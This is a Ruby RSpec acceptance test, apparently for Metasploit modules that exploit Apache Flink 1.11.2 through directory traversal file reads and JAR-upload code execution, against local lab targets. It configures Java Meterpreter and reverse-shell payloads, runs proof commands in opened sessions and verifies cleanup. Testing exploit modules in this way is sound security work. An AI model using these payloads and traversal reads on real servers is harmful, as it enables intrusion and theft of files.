require 'acceptance_spec_helper'
require 'base64'
require 'net/http'
require 'timeout'

profile = ENV.fetch('FLINK_TARGET_PROFILE')
raise ArgumentError, "Unknown Flink profile: #{profile}" unless %w[read exec].include?(profile)

RSpec.describe 'Native Apache Flink targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    argv = ['python3', '-B', 'test/module_targets/flink_read/native_probe.py']
    output, error, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-probe-status.json'), JSON.pretty_generate(argv: argv, stderr: error, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), error
    @native = JSON.parse(output)
    expect(@native.fetch('profiles').values_at('vulnerable', 'fixed', 'disabled').map { |item| item.fetch('version') }).to eq(%w[1.11.2 1.11.3 1.11.2])
    if profile == 'exec'
      expect(@native.fetch('profiles').fetch('jobs').length).to eq(6)
      expect(@native.fetch('profiles').fetch('jobs').map { |job| job.fetch('state') }).to eq(['FINISHED'] * 6)
    end
  end

  after do
    unless profile == 'read'
      append('owned-session-teardown', sessions: console_command('sessions -l'), stopped_sessions: console_command('sessions -K'), stopped_jobs: console_command('jobs -K'))
    end
  end

  if profile == 'read'
    %w[vulnerable fixed disabled].each do |service|
      it "checks the actual #{service} traversal version twice" do
        2.times do
          expected = service == 'fixed' ? 'Apache Flink version 1.11.3 is not vulnerable.' : 'Apache Flink version 1.11.2 appears vulnerable.'
          expect(run_module(service, action: 'check')).to include(expected)
        end
      end
    end

    it 'checks the actual version through an authenticated subpath twice' do
      2.times { expect(run_module('gateway', action: 'check')).to include('Apache Flink version 1.11.2 appears vulnerable.') }
    end

    [nil, 'wrong-password'].each do |password|
      it "rejects the real authentication gate with #{password || 'absent credentials'} twice" do
        2.times do
          before = loot_files
          options = password ? { 'HttpPassword' => password } : { 'HttpUsername' => '', 'HttpPassword' => '' }
          expect(run_module('gateway', options, action: 'check')).to include('Target is not Apache Flink.')
          output = run_module('gateway', options, allow_errors: true)
          expect(output).to include('Unexpected reply (HTTP 401)')
          expect(output).not_to include('Downloaded ', ' saved in:')
          expect(loot_files).to eq(before)
        end
      end
    end

    %w[vulnerable gateway].each do |service|
      it "reads exact regular and encoded nested paths on #{service} twice" do
        2.times do
          ['/opt/flink/fixtures/public.txt', '/opt/flink/fixtures/nested/space name.txt'].each do |path|
            before = loot_files
            expected = native_file(path)
            output = run_module(service, { 'FILEPATH' => path })
            expect(output).to include("Downloaded #{path} (#{expected.bytesize} bytes)")
            saved = output[/File #{Regexp.escape(path)} saved in: ([^\r\n]+)/, 1]
            expect(saved).not_to be_nil, output
            expect(File.expand_path(saved)).to start_with(File.join(target_runtime.fetch('artifacts'), 'msf-config', 'loot') + '/')
            expect(File.binread(saved)).to eq(expected)
            expect(loot_files - before).to eq([saved])
          end
        end
      end
    end

    {
      'empty readable file' => ['vulnerable', { 'FILEPATH' => '/opt/flink/fixtures/empty.txt' }, nil],
      'missing file' => ['vulnerable', { 'FILEPATH' => '/opt/flink/fixtures/missing.txt' }, 'File not found'],
      'protected root file' => ['vulnerable', { 'FILEPATH' => '/root/module-target-protected' }, 'File not found'],
      'patched traversal' => ['fixed', { 'FILEPATH' => '/opt/flink/fixtures/public.txt' }, 'File not found'],
      'insufficient traversal depth' => ['vulnerable', { 'FILEPATH' => '/opt/flink/fixtures/public.txt', 'DEPTH' => 1 }, 'File not found']
    }.each do |label, (service, options, message)|
      it "does not create successful loot for #{label} twice" do
        2.times do
          before = loot_files
          output = run_module(service, options, allow_errors: !message.nil?)
          expect(output).to include(message) if message
          expect(output).not_to include('Downloaded ', ' saved in:')
          expect(loot_files).to eq(before)
        end
      end
    end

    { 'missing base path' => ['vulnerable', { 'TARGETURI' => '/module-target-missing/' }], 'unrelated HTTP server' => ['unrelated', {}] }.each do |label, (service, options)|
      it "rejects #{label} twice" do
        2.times do
          before = loot_files
          expect(run_module(service, options, action: 'check')).to include('Target is not Apache Flink.')
          expect(run_module(service, options, allow_errors: true)).to include('File not found')
          expect(loot_files).to eq(before)
        end
      end
    end
  else
    {
      'default Java Meterpreter on vulnerable' => ['vulnerable', 'java/meterpreter/reverse_tcp'],
      'default Java Meterpreter on patched traversal release' => ['fixed', 'java/meterpreter/reverse_tcp'],
      'default Java Meterpreter through authenticated subpath' => ['gateway', 'java/meterpreter/reverse_tcp'],
      'inline Java command shell' => ['vulnerable', 'java/shell_reverse_tcp']
    }.each do |label, (service, payload)|
      it "opens and uses #{label} twice with exact JAR and process cleanup" do
        backend = service == 'gateway' ? 'vulnerable' : service
        2.times do
          before = target_state(backend)
          expect(before.fetch(:jars)).to eq([])
          expect(console_command('sessions -l')).to include('No active sessions')
          expect(console_command('jobs -l')).to include('No active jobs')
          proof_path = '/tmp/module-target-flink-session-proof'
          target_exec(backend, 'test', '!', '-e', proof_path)
          output = run_module(service, { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4445, 'WfsDelay' => 10, 'DisablePayloadHandler' => false }, action: 'run -z', timeout: 120)
          expect(output).not_to match(/Exploit (?:aborted|failed)|no session was created|Payload failed/)
          expect(output).to include('Found uploaded JAR file', 'Executing JAR payload', 'Removing JAR file')
          session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
          expect(session_id).not_to be_nil, output
          meterpreter = payload.include?('meterpreter')
          if meterpreter
            expect(console_command('get Spawn')).to include('Spawn => 2')
            identity = console_command("sessions -i #{session_id} -C getuid")
            expect(identity).to include('Server username: flink')
          end
          token = "module-target-flink-#{service}-command"
          command = meterpreter ? "execute -f /usr/bin/touch -a #{proof_path}" : "id; printf #{token} > #{proof_path}; hostname"
          proof = console_command("sessions -i #{session_id} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
          expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
          expect(proof).to include('uid=9999(flink)') unless meterpreter
          wait_for_expect(20, 0.1) do
            expect(target_exec(backend, 'stat', '-c', '%U', proof_path).strip).to eq('flink')
            expect(target_exec(backend, 'cat', proof_path)).to eq(meterpreter ? '' : token)
          end
          live = target_state(backend)
          expect(live.fetch(:processes).length).to be > before.fetch(:processes).length if meterpreter
          append('session-proofs', service: service, payload: payload, output: output, session_id: session_id, command: command, proof: proof, before: before, live: live)
          expect(console_command('sessions -K')).not_to include('[-]')
          expect(console_command('jobs -K')).not_to include('[-]')
          target_exec(backend, 'rm', proof_path)
          target_exec(backend, 'test', '!', '-e', proof_path)
          Timeout.timeout(20) do
            wait_for_expect(100, 0.1) do
              after = target_state(backend)
              expect(after.fetch(:jars)).to eq(before.fetch(:jars))
              expect(after.fetch(:uploads)).to eq(before.fetch(:uploads))
              expect(after.fetch(:processes)).to eq(before.fetch(:processes))
              expect(after.fetch(:temporary_files) - before.fetch(:temporary_files)).to eq([])
              expect(after.fetch(:jobs)).to eq(before.fetch(:jobs))
            end
          end
          append('cleanup-proofs', service: service, before: before, after: target_state(backend))
          expect(console_command('sessions -l')).to include('No active sessions')
          expect(native_json(backend, '/config').fetch('flink-version')).to eq(@native.fetch('profiles').fetch(backend).fetch('version'))
        end
      end
    end

    {
      'disabled web submission' => ['disabled', {}, 'JAR upload failed. Unexpected reply (HTTP 404).'],
      'absent gateway credentials' => ['gateway', { 'HttpUsername' => '', 'HttpPassword' => '' }, 'Target is not Apache Flink.'],
      'rejected gateway credentials' => ['gateway', { 'HttpPassword' => 'wrong-password' }, 'Target is not Apache Flink.'],
      'missing application path' => ['vulnerable', { 'TARGETURI' => '/module-target-missing/' }, 'Target is not Apache Flink.'],
      'unrelated HTTP server' => ['unrelated', {}, 'Target is not Apache Flink.']
    }.each do |label, (service, options, message)|
      it "rejects #{label} twice with exact state or recorded staging restoration and no sessions" do
        2.times do
          before = target_state('vulnerable')
          disabled_before = upload_state('disabled')
          output = run_module(service, { 'PAYLOAD' => 'java/meterpreter/reverse_tcp', 'LHOST' => listener_host, 'LPORT' => 4445, 'WfsDelay' => 0 }.merge(options), allow_errors: true)
          expect(output).to include(message)
          expect(output).not_to match(/session \d+ opened|Found uploaded JAR file/)
          expect(console_command('sessions -l')).to include('No active sessions')
          expect(target_state('vulnerable')).to eq(before)
          if service == 'disabled'
            restore_rejected_upload(output, disabled_before)
          else
            expect(upload_state('disabled')).to eq(disabled_before)
          end
        end
      end
    end
  end

  def run_module(service, options = {}, action: 'run', allow_errors: false, timeout: 40)
    defaults = { 'TARGETURI' => '/' }
    defaults.merge!('TARGETURI' => '/flink/', 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'module-test-password') if service == 'gateway'
    fullname = ENV.fetch('FLINK_TARGET_PROFILE') == 'read' ? 'auxiliary/scanner/http/apache_flink_jobmanager_traversal' : 'exploit/multi/http/apache_flink_jar_upload_exec'
    output = run_target_module(fullname, service, defaults.merge(options), action: action, allow_errors: allow_errors, command_timeout: timeout)
    expect(output).not_to include('Unknown datastore option:')
    output
  end

  def upload_state(service)
    {
      files: target_exec(service, 'find', '/opt/flink/uploads', '-type', 'f', '-print').lines.map(&:strip).sort,
      directories: target_exec(service, 'find', '/opt/flink/uploads', '-type', 'd', '-print').lines.map(&:strip).sort
    }
  end

  def restore_rejected_upload(output, before)
    after = upload_state('disabled')
    created = after.fetch(:files) - before.fetch(:files)
    filename, bytes = output.scan(/Uploading JAR payload '([^']+)' \((\d+) bytes\)/).fetch(0)
    expect(before.fetch(:files)).to eq([])
    expect(created.length).to eq(1)
    expect(File.basename(created.fetch(0))).to eq(filename)
    expect(created.fetch(0)).to start_with('/opt/flink/uploads/flink-web-upload/')
    @rejected_count = (@rejected_count || 0) + 1
    archive = File.join(target_runtime.fetch('artifacts'), "rejected-upload-#{@rejected_count}.jar")
    File.binwrite(archive, target_exec('disabled', 'cat', created.fetch(0)))
    expect(File.size(archive)).to eq(Integer(bytes))
    data, error, status = Open3.capture3('python3', '-B', 'test/module_targets/flink_read/jar_probe.py', archive)
    expect(status.success?).to be(true), error
    metadata = JSON.parse(data)
    expect(metadata.fetch('names')).to include('metasploit/Payload.class', 'metasploit.dat', 'META-INF/MANIFEST.MF')
    expect(Base64.strict_decode64(metadata.fetch('manifest_base64'))).to include('Main-Class: metasploit.Payload')
    expect(Base64.strict_decode64(metadata.fetch('config_base64')).lines).to include("LHOST=#{listener_host}\n", "LPORT=4445\n", "Spawn=2\n")
    expect(target_exec('disabled', 'stat', '-c', '%U', created.fetch(0)).strip).to eq('flink')
    created.each { |path| target_exec('disabled', 'unlink', path) }
    directories = after.fetch(:directories) - before.fetch(:directories)
    directories.sort_by(&:length).reverse_each do |path|
      expect(path).to start_with('/opt/flink/uploads/')
      target_exec('disabled', 'rmdir', path)
    end
    expect(upload_state('disabled')).to eq(before)
    append('rejected-upload-operator-restoration', before: before, after_response: after, captured_archive: archive, metadata: metadata, removed_files: created, removed_directories: directories, restored: upload_state('disabled'))
  end

  def loot_files
    Dir[File.join(target_runtime.fetch('artifacts'), 'msf-config', 'loot', '*')]
  end

  def native_file(path)
    Base64.strict_decode64(@native.fetch('profiles').fetch('vulnerable').fetch('files').fetch(path).fetch('body_base64'))
  end

  def append(name, data)
    File.open(File.join(target_runtime.fetch('artifacts'), "#{name}.jsonl"), 'a') { |log| log.puts(JSON.generate(data)) }
  end

  def native_json(service, path)
    endpoint = target_endpoint(service)
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = http.read_timeout = 10
    response = http.get(path)
    append('functional-native-http', service: service, path: path, code: response.code, body: response.body)
    expect(response.code).to eq('200')
    JSON.parse(response.body)
  end

  def target_state(service)
    # Read actual /proc comm values: matching text in a shell command line would
    # incorrectly count the observer itself as a Java payload process.
    command = 'for item in /proc/[0-9]*/comm; do read -r name < "$item" || continue; if [ "$name" = java ]; then prefix=${item%/comm}; printf "%s " "${prefix##*/}"; tr "\\000" " " < "$prefix/cmdline"; printf "\\n"; fi; done'
    state = {
      jars: native_json(service, '/jars').fetch('files').map { |jar| jar.fetch('id') }.sort,
      uploads: target_exec(service, 'find', '/opt/flink/uploads', '-type', 'f', '-print').lines.map(&:strip).sort,
      temporary_files: target_exec(service, 'find', '/tmp', '-type', 'f', '-print').lines.map(&:strip).sort,
      processes: target_exec(service, 'sh', '-c', command).lines.sort,
      jobs: native_json(service, '/jobs/overview').fetch('jobs').map { |job| [job.fetch('jid'), job.fetch('state')] }.sort
    }
    append('target-states', service: service, state: state)
    state
  end
end
